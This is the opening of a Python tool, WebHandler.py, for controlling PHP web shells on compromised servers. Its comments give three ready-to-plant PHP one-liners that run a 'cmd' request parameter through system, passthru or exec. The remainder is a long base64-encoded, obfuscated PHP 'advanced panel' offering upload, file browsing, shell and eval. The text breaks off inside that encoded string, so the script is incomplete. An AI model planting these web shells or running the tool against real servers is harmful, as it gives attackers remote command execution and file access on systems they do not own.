#!/usr/bin/python3

# WebHandler.py works for POST and GET requests:

# <?php system($_POST['cmd']); ?>
# <?php passthru($_REQUEST['cmd']); ?>
# <?php echo exec($_POST['cmd']); ?>


import requests
import sys
arguments=sys.argv
scriptname=arguments[0]
session=requests.Session()


# Advanced panel of tools eg uploader,file explorer,shell,php eval etc
escalate="""PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKQHNldF90aW1lX2xpbWl0KDApOyAKJGNvZGUgPSAi
N1QzNVcrdTJzcisvNzN2L2crdkxMYUdFckd3aGtKNFFFZ2hiSUFrSmNFNC9ybU03c1lrM2JHYzly
Ly83MDJpeDVjUmhPVDF0NzcwCnQ3UUZiR28yazBXaG1KSTNHLy9zL2VqK2hlNTdxSjlhZVRxdnR6
K3VLc2Y3TGh2RGpqd0tmSVB4d0pJaml4c1pYWWEydkc2cHdKSEMKWlJaSTRSNm1mNE9GcG9QcFBz
bTM1cXVWN0NaeTNVUlEwVlZKVU55RldTTWFXUDNQVUEwRnlIRU9YSlYrM3JiUXQrNnEvNWZtdUtw
bAppVEFsRHRRYStkaUNJS1FTRFhnanErVVlNcUtKN2p1M3BnQmJWNGZ1U3JKa292U2hBQ1VzeTFh
TXZvcGpxU1I1K29XMU1pVi9FSWxTCnN5cHBOKzRSZXBqb3E5NnVnR3A2NlRLdkJYSGVXNkVVU1g2
RVpBZURvTnBpcmxtd3JhbUlsQVdNNjJRWUs4Z1NjYmdIaUw5YWZRN3oKVVlQNGEvUlpwcDVzRFJE
aEVuVTkyNzBrMlZNbEtvS0pyQ3FLR0tRMTB1V2ZiSm9PZElVaWdWa2hEWEJvbDZSWWtma0lFMDFF
cDFkUApucUVGS2FxMFA4T3JVUjVucTFER0F0R3Y5cEpnU3czVDQ4MW0yUnhacUVucmMyTW9paEov
aTJWUk1RVTJmUlZNM1ZSSGFFc0loNnFoCmJNRml1YlJ3SXpxaUhoa1BrSWFwVFIzZFZENUFva3E4
bVJGZE1ta1BVWGpXUlNjSi9XZlJmTHBQUGJHeThndGlVcGx1b2cwZGlLckcKYitRbjluOXYrYVE4
WFFOTkZBVm9IL1dZVVh4dXJMdXFubUUxbHNpTHF0bWYzL1lua0FpY2llcW5XT0NHMnFzMU90Zm5V
YXRUYTNYSwp6Q3UzVyswTGlrMjdwd0lRSjBaUDY2cE9KeUNkdUNMWXJJTjd4YmNPZW9BYkd3bXdJ
UjZoQ0czRWdxZzRsUXlxcXJ0MjhxeGJ4RElvCmsxOHFYclNvMGJPYjVxZ25qNkdqTzB3aHpGVzVK
Z3F2UEcvWFFXNElDSTdMbGFXMFRIVmVIL2l6VVJGSm9KWXZzTnlQTWg1SS82ZDYKVG9yc3NZNnly
RTVLMzVreVVrT05JT3FLM3JHRm9sTG5CNU1JaTdDd09FRStCSDZCVnBONGYxa1llSGlCWGNuUXRv
VTRSYTB3MFd6SgoxUkVmVUlab3Jpa1VDclN0UldGMGhjRGdkb05ZYzF6WWR6TnBRTmlVS1g5WUVu
STdiQnBORW5paUpqZFJKdlZtdHRCdk5oNmRXOWFiCmNMS05IMWhQaGExRHhKeXlGUnE2THBzRVRw
T0g1aVd2RElIRVYvamp3aTJHTmlETU5SL0sxQk13N0pGMi9RTmFZbTVLUWxGd0Q4dUQKa3RmSG5E
Q0pjMzBZRlpVMUl1SkkxUUVCbE1TaytvaUdXUEdITlVIMWZkVGVnbVVoQUdOQk1ObndrS3lVZUlL
U1VqekVNQmlhWm5wQgpDcERxVUJNMVYrMGlLL1R4RDg0a3YrRVVzZlJaRVdqaElGMEdVcjQwUklo
NFBmUzR5d2tYcjhCekpFbVJEOGp4VXowQ2FTUWcxVjlkCmhHZ0JLSWlvZEtTZjhjcGlXU3RDRVh4
bkw5RWVXRExMNENjMXJEK2tERVlUekZLYWVNeGtCRTREeVdRMDBjQWVZVTlDZ1FOTENIR0YKcHdW
UlVYU1Exbm5TSE1vQm1lMzV2UnVUOEU1RVduOFd6ZHZ2bTZhelJhbU5SdUdiT0NId0FzTjZzWGpY
YTFhZnl5VWtUUyttZWJpbQpPN2ZwWUd1V3p1YnpJSlQ0NWlFaVEwOHZ2YlE4cDkzZ2NsOFN3YTVM
T0t2Z3pjZzA2QVJEakpOWjA5SklSZ0ZPRlF3SDBnZDNIYzlCCkRBaDRuYjI3aXVZMzRjczZYZTJi
bG5vWERJeWdOanp3c0REbmcrYnoyL011cUtjVGFFOGRtR0F2WUdNQUhCSkgrQzVvellod3lsQTYK
TUlDNW96aHRFOU0vckxsYThWRWpaQmhFOEpBdTlrVHpVZWt1ZGNEbm9qZVY4Y3FubVJxMUlBWUlr
ZVVJZ0c4WFFXbUZwdUdPOVVSKwpyWDZaRUVBdjNYQ0Zkd2lNSmVVQWVJcHU1TE5SMGtCakVFdUlB
ZFNXdXZFaTRUMERjaEZWdXdJeEFqYmdKOVg5MEdna3pleFFXdy95CjQwQWltZFRiNDJwZ21pc1hk
dUtiSUF6eGt4cnkzZUsxMkdDMGU5cDVPK0pUNG85WHpuQ0lJVGZKRUdBTXhVREdZMEZUaXIvbGdv
bngKRkl0VWZ1WmJndTdvSnl2SEpWUjFEa3BHUXBOVWtSU1JRTVN6V09RRVd6cVNpbUVERS9RQWlI
bWM5dll4c1gvV2VCbzZjMkFDSlNTdgpDMElDSnZxTTZkY2REWGRWVWo2S0sxT05wOW9ScHZTVFZE
OWdDQm9aRC9DTzVyalFqaHQ1aXloOHQ2cGgrL1JuOUhNQXZ5aXFLaGxKCnRSN1VDN1kwNk1OR3do
VVduQnBoY09GZlJxQkhCbEJDeDFiL1M3bjMrQmFZTXBFVldFRS85QU5sR1FKd283SytJbjJ4UFpa
VkFrb2QKa1pZTEFvbmZ5cHRBM0xGeEFaTDlIWnFJRkZuVGlVeUFjVVZtQ0ExUTlNeWJvaEVjekQ0
bEhVNUF3elVOaGhtU0QrS05rT3NYcEVlSQpGdy9naUNpYW9Dd1dCSUVyNzZOM3pad2FzRlV3SmpZ
dDFzTzlNa1lCRi94WFI5QkFPZmFtSGFNbG1qV3dxUFh2S0Zacm9DbHF1N0dUCitTYUhkMHFHdmxD
aEhIYWJSTTd3ZjZwWXo4Z1hidXJMUmNEYVF0RUJGZlUzM1VuMWJIbm1JclJCS1hTRVZvRWRXSFM2
R2xpc0NtUGQKUUJERXllcU9MR3dJYmJjbDJKdU5NQWR0WU1rYVFqQjdUclA0bzJ0N0lEekVqczlY
VWZhN2NxUzM4RUZaRnN1TXEzS2Yxb1Vwd2I5TwpJQkVnbndHQ1Vsc2FFcHo2YUNHOFNuelNiTmxI
VEZVVzF3amJOdU5heW9jWU5DWVlCYkdHOEdrVE5NZEJxNVJ2R1kyRDc5cnNIQk9wCjdlMFFpYmYy
VFJnYTlBRitYRnRnYlQwdFhEVmxaSzBFMUNGcURsL2dLU2pCQlY0RGtzaFRHbmxpcWV6Qnc3Wkh6
QmpaSGRVMXZCVXkKV29VTUtUZS9ycXJJS3JrRGhDT3RSZEpnQVl2R1Q2cm8yVmtsSU51bldJSkha
S0s0aE1oNkpQVWtlS2paYVAxSVRiNDBzY2owQkJFdwpOVGVrRFlaaTM1aG5oaThWbGdwS043SFVJ
d0JWcHBQQjBxeWpJbXVRaW8raEk5K3l0L2YyZHdsWVdGelpWaEJYOVFHR1E4RUJtYkJXClFGY29T
REJpZkU5dFZNQXk4eE1EY05TOXhObWZmM3Q1VlcrMm51Mlo5L1plWUFrMjFyN3BvV0NLRnNOWGNy
TmFxeldvVFNvbkZyNmEKa0d3bXhqK1J4U3NrZ2lxV3loZjI5VHdOSVRzbTJpVlE1SWw4U1VDY1pW
VGFLMkNBa1Fyd2s1RGFvMVh1VUthN3Boemg1SzFmRVZtNApnMGJIbGlvUThOamhqTFZlcUlaa0Nn
SGtVck1Pb2xzSExMekxkaWNxakwzZ05qdFozd3RkZ2ZRdGFtcWhiMEc1NFBuMkthbkt5ejRWCjVs
K0VCZzJVTjh6RUhqRFU2QWNaWkVXQmNIRnFMMWVjNnNXNVQ4VXN2WkJteUpWZUsxTUlLOEN2ZkFD
TlozLzdLV1h0TTlDMVo5VVQKaWxOYVlKSlJLZ1RTOHJGOWZzSmRnSWdFUGIwbUdQckFPWkVSdFZB
OVpFZUM2WVdGSUM0c3BNTTd3cENWV1NKajNGaTZ5emFSc1hXMAo5Q0djSHVwakVCRFR4bGhNeGFM
aDZDTG13VFBaMVh4OW1FWXBJSjZFRTF2VElHdkdETHFOMUFTQk5PWnFEQ3RBM3ZIYjlQeUVzL2l5
Ck5KVTlHSnFOLzRJK0drcHRZSjNXc0orbkRFMGpOZFZBTEdBZEhRMkxZdjYzb3VKWmpaSnhTOFZT
ek43Sm0rckk2ekJRZHNPQ3N3Y0YKdlZJaHhXbVpKWVdTM3FjYUlWVzdtRUZsNVhBM1NFNkxFRXlI
Rks3WEU2ektLa3l6d2xocVMzNGxxVEtyeDByejZVZ0o1SHBxc2thbgorRjU3cldENytFZE1kVi9U
ZFpqekI5dHFrejcwOTZXbmZmOU84ejdGNW4vdWU4ejczOTd6L3JmTmVDQ2UreUUyU3Y4Z2t4Nndr
cHVBClF5a1VvWlRWb1ZVcDhNblJyaUdpMXBQUXBTUHptSGQ1SFpsS1RiT2t1TDZNQlRjeXkrZFhX
L0U2Y1RyY05vL3hPT3lpK2hmejlFeUsKWGVXMUMwQjNLbFkzNGJUT0M0UXdTdmdtZExGbXlhbkRv
Z2dUYmtnMWRIa0t2aU1SN2JRaVJISHlOMzdCZ2pFeFB4S2lJMGI2Yk1aawpLSy93dUtvWk5ZbDdG
dktJTVh1MzdhdEtFT29NTTRwTGE0UlZYWDFFTjFWY1hweXRNVFpJVDZ1NUE3UDBhcm5uNjRab0h0
dWxnbDI1CmtHTUcyT05tbisxYjVTQS8wM3lNZEdlaS9rMndrNS8zTGtqR2dQZXpYSEdHQ1lWT0pX
UWkvU1FUU1N2OVFBUWlHenA4cy9sZ1Qvck8KRkg4Y3h5L09iRzlsbHdSZEtzTkZ3NUVyZ3Q0TFk2
Z055NjNWWitFRmtyd3RCd01XUUNVc0xpS2hKeldZSHZMekRmUDR0OUh5UHRLVApDa3JVcWxKQ3JT
eGdoTkNLeFlVc0t3Sk9Eck1TcU11Q2dGSlNERnlpenNTQ0dPVUZFdDFOUk1qdVFncnpJa1ZQQUYw
Uk80OU0rZmE0CnlielRpRXNUT1dvTGN3eU1obThsdGJ3UjRJYlZJdlRrV29YNGlvRitGQURNU3Fw
WkNnZElZSnBuYktBYXRGRW5Pc01kYjA2OFU1bkEKc29EQjdnUzhBUnNOeXlYa1ZSd2J3Q1ZtVFRZ
VjBjdkdRYkowY3phN2pzejN3dVBKOHlmWGgyTzBUeVNGbHczTWZnSW00b1FFb1NsTQp0SmZUV1do
d1R1bDJ3VkRscW0weXJoa2RjVjNMTlZiMlI0WHRjcGZRd25taGdtbzExTUhrRzVSb2NvcElrN21q
eXpWYkE3cTZ2dWFNCjRJckM4MzVVTStLRHNpUkxqYTFoSG1NNnFYOFRJamJNL01uVHFGSmhrWjdu
NEwvRWoxSzIrQVVJSzNQTjJ0NThVRmJzVkJrZkNlRE0KbmNOYUVVMDZLU3B5SWhDeDlwQVlvL2pt
cFlBNTk3dVB6eU1DYk05SWt5ZXpwUm1JTnBGR1NBQWgwaDlqaHFzSFpvaXVHeDZrLzlQSAo1WTkv
Qk5hOEJqVk1BRDhlcmtKekUwdzRxQzZ0M3NJZUNrNHRyUHpSejR1bytoc3NsTWNKSTI1M2NZdE5S
UTREWEhKZjVlV0MvRSt5CkpoVExBdzRuNEVpVitVRTNIbjlIRFV1NkFISi9Fc3lQVVlLcEhNOTNG
V3BuQXBCTmg1QnJVYnBUb0FYUG9YQWw1UmNHYjZENjBFN2cKRG9aZFJ0ckErbVNET1hEL0E3U1g5
V01jcEc5aXBCRXFpaDYwR1BEUFVHOFVlSXU2d3lEQVlNMnNheFlCVEFNT1daNDljV1EweGxWNQpE
aE1kc0hSbWVsQmNtcUV4eU5iU0tlZ1BRWE1Va0RkZHM4elZCZ2tOYnNkUjh4RkxlQWg2Uzl2RWVB
T1dpbUU2cjdTZ3RYeTB2STVnCkZCRGdwT2hwMkxBcEY3VXRJbUIwSTlEMlVhUXcwSXVwNSs0V2Ji
ZUNNY29SMUhwK0pHUnZlajliWGkvUVJCQ2lCRjM0VU1wbnRUR1oKRCtGbFlkNkg5NjF1cndISVVi
UEk2V0phQ1RWOEhRN1crcDFKVTYzc3FSYlcrcTlMTTlyc3F6ZVRlVldrbXUxQXBHellNWFl6UjJm
UQpucXJwNTZ5M3E1eE54OFJIRXBQakUzSHVJdHhtNHo0RWYzVk1QcWFNanNkZTUxbm9GZTFLOXlU
V21aNXZiamxiZnZxNWZsNjh6R2VsCmhlaTUxZDAxcCt0SnJYVTZ2VHk1TzlQdXBmdmt3N09ZdlRo
dE9PajgzR282OU42MC83Qlh5eitPK3NOazM5aTlhdDJPMDBLazBjOWQKdHUrL3VPUG1ldTY5MVRl
MStzbnQ4V3pBZnl2dUcrZHpZdnJ1Zm5SVHMxcTFVN2hUS3M5cE41Ym9wYlRyTlN0Y2ZtTGZ1ZVZX
NFNaLwpXdFZIL2RwRGJMdlJjWmRzeW4rMUNjM3I4TXJzdWp5YmRoakkyMGRQRitlWnNZaHpycnFZ
NnN1K09Ha2EzY0hXdStITjMrTnp1WE14CnF4OXZaeDBkQnVXalh1eGU5akdiZlRjeTdzanp4YS83
dXBybFp2Yi9vbkhmODV0bHB1WkxaRzNmUzZqd245eWZqKzViajYvTE1IOW8KUFJtZGczS2Y3MS9x
b1BEK3A3bll1aFh5NzMzRW4yM2J1Sm90azdzM2NPM2NiZmJ2NWJCVGt2dFo5SHRjbGY5NGNYNCt0
dlUxdng5NgovOFF1TjhWMXozbjNzRkxhVjJ3RWF1a0dta3AvY2RpNUdBK0h1SlZkcjE2em5rL2w0
V3I1M3RHbEJ2ci90VDkzZEc5blhMcXQyZWwvCmFmOWsvTGx3T25PSHRudDBZWEZ6MXh0ZHFXenU3
OG5xdFJtTzNVQzluak16T2czTS9GTTVPMnZ0blU3ZVRxVzFmNnZPN2JyKzZlWlYKcmpaVCtRTmNm
ZW8zcnFkN3kxWjQ3bU5XZit5OG41NmVadlhKWEw4OGZqdVhDcFQ2K3kxOTFuTk5hSnpmTm5tOTMw
Wkp1V3JiMDhjUApEL2xtbjVsVmZ1clhOZEgvUE94N21ycHUzRi9KSk9YM3VlOVdkcXhPelVMMDcz
YnpTNU5yTDBMblBuSm5UMDk1TGI2Z2N0NjhNUlRwCnJlbmVYd3FOcW42aU5WdTE0N0tqOVN2OWU2
eVBlR2JTSDQvUE5aLzlDYis2TkwyM3Q0YUx5MHNvOW1sZk41KzNIbmNIdFk3K2xYL1gKMFhmMWxx
Rmhua2x1dDNqK01ocnZDNk1adkt5UFRjek5ubGUyWEhkZWRYK3Y5enA1WHlUOTI3OHlYemN1TzBa
RjJHdjNiNTdaa1BUNwpjTmpidit0aExsR2QreHpnU0h4L1B0ZlorZlZLdFMrbGh1dHgvSGhxRFZr
NHFieDdYelBPVDQ2emMzUm1ldFI1UDUrMkwzTzNVTVVlCjVpZkZnbjZSNzd1aTQzdGQ5Slo4Zmpl
OUg0M0hYelFyWDVuMnptejNwenZiTzZxYWR5YW05cHBJdFhMeGtLL1ZSSjM5ODdYZFA1N2UKUDZp
Qy9uVHZScHZMRFJLNlV6OVJLdDJKbEJ5ZU42a0RQenM2MHk0ZjdlWDh5RVB6cmx3dDE1S2RuRitm
WCt0M3h0amQ4MEFiNVIxVworcXJZdHcreGZYTGp6YmJ0ZnU5L1Y4czNIOC96Sm5YbFhrK3kyTjIv
c1BVL25OeWRlcHJIZlVtNnF0OE1UUVUxUHZmUmcrT0JkRjA1CmEybW1tSlUrcTUrWDcwL0xMNmFo
dktpODU3YUpXc2N4UnR2NDhiZzZkczEydG1xNk1KanVlM0c5TDNYS2pVeTA0Vnp2ZEszdDBsUkUK
dVc1Y1hoYk9ydkRPNmNxNDFaOC9kZjZ4MWQ3YWZCenVUKytuT3crUGw3ZDNzNHI0em55aDM5NCti
N2J4dVB0aWRndUx0bmI5Y042cgpHYmZ2Wm10N0krOE9tMjdHRnNkVE55enVPMU1ydWVzK1A5dTVM
dXpxNnZiakwzalhTelpaVk96K1ZwSUZjNi9TZTc5cVZGN1h4bUh2ClJuNjh2dTNQM1pQK21yZVp6
OXdVMEk4WlhtZDd6NmJHd3FhbHl2M0ZiTTlyYmQvSmxhMmpXczdMNmtPKzR6c1hWcktCMDd5cWR5
bkcKL2JkemU3elltcy8wajdMTW15VU13MVMxVjlvL0UvbU90MmRxL210VHE5LzNqdEhmVGJVMXky
cDFydmN4dUtwbUtjNUsvYVBuakZ5MQp6MzNSa3I1cTlHTm9YdGZTOTN2WXI5YzZ1UDlyWjJYemNM
OHdlZHJxWmxpOE0vZFBqZlVuWFBNZTk2UTQ3eHhmZXdNcEs0NTE1NVRxCnIzNTU2amZGMnJTY05k
NTJ1ZVQyNFM1L2YzVmEyZTNtamVaYy9idTQxYWk5eVRYUDhLeVJoYy92UFFpczMwVG9qbzlJM0t0
ZmorODQKc25iN1k3VjhxM2ZwbTYwWldoMmppdG94cGZkcTJtb29rbjdTcVphdThPM2c4Yng2Zlhq
bGFiMUxKank2dUovdGw3YjU2OFNnOFMvbQo2S1JzUDBrRGJ6VnFGODR0ZXU2eU45cXAyN3pwLzI5
czJuN3ZwM3N6TkhMY3NPWCtTcjNZSEwrcGUvN0tSbldqT2pvbDB3S1ovZGlWCmZuem1uZDgySjBQ
YUdZMGNwNURiZHFYMVJWUnpGSFQ5cWcyUFZTcXRUSklIeVZqV1gzZGJiT3dnZ1habmswenZQMG90
MmNWblFhelYKbmRIRWpUZXFYbmV2SjBkSm9nSGE2NzV6MXBFRjlXajNMM0tmcmlxWTlYdDUxYTls
Kzl1R2lmcXdhdFpmKzQ3bWgzNW01N3A3ZDA4LwpQTHkrN1JycXdQY3dWM0s0MnE4N2x6Y2RjKzls
cGVhcGJGbzRmWnY1MjlyeHZLSDIvTTVMenlsNno4Rkl3TCtWVHRWd2Q3dXp1WnJ4Ck9XUnJLMmRy
dFMrMTQrbUpwdytPT1VUOHhDanZwZkZmYXp2Y2QyNTlWeXNmTndvNHduenZ6aC9KZVJicDYyWmxK
ZDVXTGJLZjg0SXkKY3ZYdnA0ZEc1cVdhdnkyNzkyRHh1emdjZHYvTmduOTlleWMzMGN5Yy92cWhr
M2ZydVpOQXlyOU1Xa3NwN080SyttY3ZLelczSDZqeAowN3lUWjBNZnkxVlY2T202ZVBHc3pyM2ZX
bVNocXBydDVrWm5NendvOVAvL1FiOTdvMXFCaWRDcVdidTVKNmNmUmVTVnozcDcwODJXCmhPVHpK
OUp1Yng0WDc4NXk1dTU5L1R0ODROdzluTlduYzNjNVg1dk41ZDFhcjkzdjFzbmFzZDNYcitLeGli
NWZ2VzJiTm1PcWptK04KOE5aTWUzS3ZQT2hyaUIrRjVJajhNUnZXeW1qdTl1dGFmSHd2UGw5dW5E
eS90MW5HaFBLNmFaNmZQdzdTWkxXalp5dW40eGo2clAreQpVc3cwdDUxZno5M1UxMjV0ZVRQYjJI
dG96ZjdlZHF3bTcvY0xrdEhvelJVTldHNDUzR2kvdXRsL2R1WHlvV3ZhczNqK1pLR2Z5L1VWCldO
OXgrV2JucjNkeGNFcTc0dVNRY2FyNXBsQTdCb2FsMDZPdStvWllPRG9ocm1HQm1yYXh3K0xPak9m
UVcyUmoycGxHaGc0UEROSUUKVkRzbldHTm1seER0MTZYRERUQ3p4UzJYWU96T1FDWjNzU2U0SW1W
V0tMWS9nTGh0c0FWWU5GUjZQWjNVRncyeWs4T1pmQ3E2L0dkSQpNcmNMV0xkdFNrVlczcWhSR3Vs
eXFaOWp5Y0IwTXRNTTBhUlMwR2FENEpzdWVoOXJhczVYWlZ3Rm15Z0R2Q2gzOEk0Ti9pbEJjUW9Z
Cjkzb2lFVmJ5TDcvZ2RRSk53M29GbUk5cWdzcmFycU81V3ovWjkyenpJT2xQQnN3MWRFZjZ4WGRu
UGwyc0ErOU5Yb1krV3dsdXdvWFMKUVJTQkY4dDZYVE4yWUhiUWx6VVlrNnFpdUlsbFNzdXpxa29H
V05iWmh1d2YvcU9FZndQSVAxTzlSdEsxWi9GTVVPQ2ZUSFBxM1RmNApHaFFUcHE4QjJ6Q0V2dXcr
WndXWjZCR1VPL3hSWDlKdDR6bStCclF6SW9wVUVGT0ZiV0lEL2lxdXBsTWMvQVlCdk8zRzV2d29w
WCtwClpxditWTlR1N2c2Q2trVzhMR2Z5SFlUZ1E0b3Via202aDRhU09BWm5NUDNFcUhOakFlaDdU
bWgreUZObU9qeWMzclFsUmpsRVZFMkoKbEh4bE40L3ZJY29OS2V5TS92bDdLRXF5VmJBQmh2SU5H
OFF5SWZ6akVaSUNTWEQzdlp1TDRwblAwc2tjK25HWUU0eE1aazVnaS9FQgpvcWo3UWZPcFFIRGNa
QXpwbkdGK25pTVA2MG9DQ1VIdlNyYjRkY3J4QUNZUnllMWwrSnVaeGRlRlJVa0Rma0c2OTNEc0tS
UGlzOStUCjNEQ28ySXVjWGtlSENudUJjcjRJa1NtY1hFeVNlazVGc2hnNEtlR2MrU29BUUlmRTFq
NEFycnpLVmpIOUNGTHVvYmhBVFVSeGFFdjMKN3hobU82VGdoUTIzWnJnbENqc090NVpMOEM4aXNH
Q0p5Y25SM1lUQW9mV0dRV1BmakJCc3ZDQW1GcUhQNEVpL1I5RmZWUUFDRXlmcwpXQ2NMeHdSTFkw
QzExaXpKL2p2Rm9nRkFMV1RoUEIyTVZEY015WkVJTFNYN01QcUNwUWt4dXJEU25QSU1BNFlnWjly
ZWlBTldUYXFWCjZIREFWbTc1MGFBSzl4UHExVC92TVRwR1JnVURVT0tWdk9McWhzc0phSFpRNUhF
NWlHMFk0QkMwdTJOYWxMU2xINGlwcllSMkpqUFcKTjRDSUVIRWtyK3BpZXY0cWdIeURwaDYwdGZD
RmZ3TVREQnhUb0hWRmtheXRhSUpBMHdXV2EwaUcraUlCUE1ybmJCeUlXQ1dKcDBhdApSL0Zrczhl
NERZaThybG5yUmxKeFlRbVlaZFNZWXNndHhFY2NKaG5hVjVjWkJzcnNSNGZrb0IwNk9PbjVtdVh3
QjlJWTZ2a1FjMVZJCjQwa0FldGdNSXpRSnk2V2hJSUIzSUZQU2NxMWhrSGwxUXVWaWlERWo4RmQ2
RTUyOUFpU1g4NTJNbFVTYXFjeXg5c0pnNTgxNVFoZmoKUGh5c2tURU1mUGxZYVdVQm9mdGk2RDI2
YjlQRmpHRVlPSEh5SUpmTDNnNzJXZE9nMCtrM0tjVnlCUng0WUFvODdSck40NDMrNkVLYwpEdllO
RDh6cUN4Y2R4UHk4NHFNREpOYytneXdQSC9GYXcyOHJpblRaNnBZMjd2SVlla0JTWFhGVmlJTVJv
b2Y0VlVBQzd2dUNIbUY2ClFlN3pCdlNTNC80czBBMjRjY0ZDQ0Q1dEJZQ2xVc0JGTktJdC9MOGNa
V1UrcnZwekc5MkdRbkNyU3RWcWF0VG5zQjNVY0lhNFN3Y1cKZ2Z4YVpWMDdvU2tJOVNhZ2pDZk1i
d2U2bnJOTkJkNkwzcVRqL0R5WUNhQUttU253NGxsVWpqS2ZKZW5CVGt5dUIwdUdHT3kyM21BVwpP
VVN1eWdFeXJzbXpYcDNlektmb3dNRVJRWHhGbjBpdW9peldTVEhvdGZyRk9ta2x1MHkvV1NnNTQw
WkRDOFNqdU50dUFTYkRHUUR5CkRGRU9SWksxSXNocHh1MDF2UU53dlFJQkdmWmdLYUtBamF6bGk3
ckQ3WTdEdkU1UjJTaFZTdWFvSVBqNzVvcld0OEZ2N0ZIcXR4VFcKV1EwMHZUdVBmc2FpMjRGSTFS
UmNCanJ1K3d3dFYvRXhyUCtJYndqS2cvVWQ4VjFpR2czay94UWpKWmFDMkg0WGRvQm5ZUlZpUkVI
dApMbnVvUkoyRnhPVTZKMHNQei9MK3A1MG9QMHNMdTBaZ0lzQ3ZrT2Fxc1N3YSsyeGVoQUhoVnhk
SUhpNGUvQUlsd011NXNtRVA3L2diCjlHSVVDRW9ZVE5PMlUwQ1JGaHBvSDIyVndYWkhJRE5BTExQ
Z0NzaEd3UklGemJNZTE4VHdPb1hCS0JBaVFSaXNCTFMyeXFGQW9lUVcKVFk4bjl3NHJCWGM1RExY
Z1pxUzZPNDRNdjNQZTRDRnM5TENkeFByZ1ZuVFFiTjBLN2ZIeFpGZW8xb1hwZmI3VmJaTVB4Q1Zk
Ui9HSgpWbXRWeXUwcUIvc1hsL1V0SUNQOENiZmt2NGJKeGZYcDgyVGdXcmh0dDRmcnU4bExZUUNV
dkcrVVQ0YVRjTGd2MTYxb2RsZjRpY3ByCjBpL2pGcWwrM0d4UXpYMm1yZWxtdHRJV2ZoRnF6Y2JY
UW5EZGJ6RWo4dHBRT2hmT2JsMnArODRXWUZlV21YRG5NTys4cFJDZFh0TXAKZ3hyMFRBOHpDSlF6
MEt2RDdNTUNzWE1KQXB1cDdNU0JHV01aQXJocS9BNFBTaXhaV2VrRTVOSDBEa3pLc0Q3TTk1eU5O
ck13bGIrVApDL2orTGRQSFByb2lUR2NQWmZEQ1pjVFdyZllYajc4WkhMdEd6QnIxeDhUNU5xMk5Y
RWJGMUQzeU9PZDZMUkE4SnBNdUtlL1l4OCtFCkxXd0pySldtTTFoQzRJRVdOcEIrbGJIaWpIV3JX
SkU4M1FsdkswRDJmekQ4a1haVWU5akJEclNIZWJKQ1pJRzNkQ0l0Z3Q2WW4xNTQKa0NESWM4UTcz
NDhrWmVSb3Q0Q1ZwUWV6c1JtSjdrSXdOemlPU05oWWNJZ2swYjZxOWRqLzVUOVJoUU5PbzdzSVA1
QklsZm95NWg4RQpwajhEL045N2taeHJpMnhRRVlaNGdsU0xqTlVkVVJ0UCtwTUplQ0pmMXEzcGJ5
Q1N6bVF5VHlTOS9DK1cvc2xCK3RSeG1tMmpSWUQ3CjhMaUlkVllBTFk4bjI3eVhXWmRzWW1kYXlY
UCt3V0krUjFMaHRDYkYxMXVnS3RYcjE4cVFWUDRNWHBEZHAwaHZpbTVPNVdva1d3V28KRDJqR0VW
eEFwSkgxUm1zV3FGZFpZSW10SVNOS2ZObFkybUNvYTI1Y01hT21LaGk1YjJYT3lUSEtrQWNpOGhH
NzVHMEtZRlFZQndkbgpaSW5tMGNHOUF1Z2xRSmMyVlZYRHl4VTBRMGdFZ0RDRFpmVVhvRXdUVGxw
RGRRT0tUQjNtMTkyOUpXcGlvVUVWS1RPSmI2UXdyRGRBCkZDMnB2Y2ZnUUU5bHkvQURpOFFnRG5l
RFNvRi9oaWV3WEVSOXUvSTdqSDBBY08zZ1RncFZtWkxVRFFhb2dHMnUwSldYMmluN0RBVjYKV05B
ZlRGMWwycXJSTHB2WGJGK1QvVmh0L0liVnhBMVB0MEZNTlZZNjVoVWlSek1sRlBRMmlxaDRGWWJs
Y00wVWtOdzdPVmVMRGFHYQpMRUVUektKajRSUlk4RTdNcTVsL2J3WjQyWEx0MEZ1SlNCNVZEOG9O
UWtEQ0RPR24wRGt3QzZaUUtmTTBlWS9IL3lpTkxFOURTb1dWClRENXh2andjRytpdEV3MnV4Y0Ey
T3piNFVia0NLYkhIRW02dWM0bHpZcXc2dFZTNXUrQ3Q3R2tzeHNqbHo5Kyt0Z2IvRnlWL0hqcVMK
cW5zejRKNlVISy9NTk5sUDRPTUppVVV5U1ZINVJUY0ZBNlpNOFR1dVRCRG9odjRhV0MyKzRCQmhC
d0JFVGc3Y3duQ1ZWSGpnVDVFQwpuNzJLOXZydEk1Q0svTC8zS1Z2Wm5GakRISHNiSG9mMGxPTFJm
MkpiOThNWkpvQmxJcURsS2RtUjlQZlYxMVZDOHdQQ2t3ZWQ0S3psCm1kNXBaYUZEMmlkeDF3K1dU
YXpxOVJLMHQ3Q08vMmdaaytTNjJBQTBEcEI1RmJVRzgxQWhzNUJoVE1MSDJETmlmWCt2aE04RVBR
dzUKVlFFam9pSEU0ajFpSHhMQm02VUdKQmJNUjVpK0EwQXZrSDdFZDZmSHVIODkxT09ManV4aVB1
OEw4bGQ5ZmdRWGFUYk5ScWJaYWwvVgpXdS9qRndrbWRjck1PdTk4dGx0QnFsOXQzcmIrM3ZmL1di
WDhsM1laNi9mdnNld2NIejIvdmQ2TW1KR0kydXBHUy9jQXVOMEtTSkhvCjUyTjlHU2J3ZWhwN2ls
WGZ2UDJWYkczYXdsZDY3dDYrWlB3YTVpMDRJeWd2dXFOeU9EVUFpU3hiaVJPSlRBUjRWR0tOQVRt
cXBuT1YKT1dkbTNTWllkbTBMUEpTVC9Gc1FmbllqTVAyY1dlTzNFK0VJdFRlT0Z3dE9nTUhGWUl6
R2tlU2NwNGxVdlJwMko4dGdSTzR5VkRPNgpjb0V1T3hKeklYRXBJOTF1M2wwSDNnMGpFakdkNE5Y
YUdlR0V4U25Xa3psd08xeGwxWVdMK1N6QVlnY01TWWF5Z1o0WXRTelFsR2hBCjZwaFYzTkNEeGQy
c0pjSExRRXRlMjM5T0lHeHJ4K0xzMUFtWk4wQWdXVC9rOURVR1Q2dFZHN0grZ0RRaFgwSVo4UHJN
TDlWTUw1dnUKN3ExRmVqb1QvanZkVCs2Q2pHaExQaTM1cXhKTVBjdEFTeDFLb1p4bCtSMU1nL0w0
SFRjR2JCUGk1NzlybVlqNmtoUkNvTTg4d2xSYQpBYUhJSVIxMEVGM1lkdUJJVUFHODl3QmVWY0Z4
cjFzWmtwTEprQkdWU2hOM2VnN0RCWXJBL2k4U2hDc2xvZmx0NHRqTjg0cExZQkxvCklCTGlQZnFr
